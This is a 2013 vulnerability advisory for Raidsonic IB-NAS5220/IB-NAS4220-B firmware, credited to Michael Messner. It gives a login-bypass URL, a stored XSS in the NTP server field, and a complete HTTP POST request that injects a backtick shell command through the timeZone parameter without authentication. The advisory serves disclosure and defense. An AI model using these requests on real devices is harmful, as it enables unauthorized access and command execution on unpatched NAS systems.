@@ -1,0 +1,67 @@
+Device Name: IB-NAS5220 / IB-NAS4220-B
+Vendor: Raidsonic
+
+============ Vulnerable Firmware Releases: ============
+
+Product Name IB-NAS5220 / IB-NAS4220-B
+Tested Firmware IB5220: 2.6.3-20100206S
+Tested Firmware IB4220: 2.6.3.IB.1.RS.1
+
+Firmware Download: http://www.raidsonic.de/data/Downloads/Firmware/IB-NAS5220_standard.zip
+
+============ Vulnerability Overview: ============
+
+    * Authentication Bypass: 
+
+-> Access the following URL to bypass the login procedure:
+http://<IP>/nav.cgi?foldName=adm&localePreference=en
+
+    * Stored XSS: 
+
+System -> Time Settings -> NTP Server -> User Define
+
+Injecting scripts into the parameter ntp_name reveals that this parameter is not properly validated for malicious input. You are able to place this script without authentication.
+
+Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/ICY-Box-Stored-XSS.png
+
+    * Unauthenticated OS Command Injection 
+
+The vulnerability is caused by missing input validation in the ping_size parameter and can be exploited to inject and execute arbitrary shell commands.
+
+Example Exploit:
+POST /cgi/time/timeHandler.cgi HTTP/1.1
+Host: 192.168.178.41
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.178.41/cgi/time/time.cgi
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 186
+
+month=1&date=1&year=2007&hour=12&minute=10&m=PM&timeZone=Amsterdam`COMMAND`&ntp_type=default&ntpServer=none&old_date=+1+12007&old_time=1210&old_timeZone=Amsterdam&renew=0
+
+Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/Raidsonic-IB-NAS-command-execution.png
+
+============ Solution ============
+
+No known solution available.
+
+============ Credits ============
+
+The vulnerability was discovered by Michael Messner
+Mail: devnull#at#s3cur1ty#dot#de
+Web: http://www.s3cur1ty.de
+Advisory URL: http://www.s3cur1ty.de/m1adv2013-010
+Twitter: @s3cur1ty_de
+
+============ Time Line: ============
+
+August 2012 - discovered vulnerability
+27.08.2012 - contacted vendor with vulnerability details for IB-NAS4220-B
+28.08.2012 - vendor responded that they will not publish an update
+15.10.2012 - contacted vendor with vulnerability details for IB-NAS5220
+15.10.2012 - vendor responded that they will not publish an update
+12.02.2013 - public release
+===================== Advisory end =====================
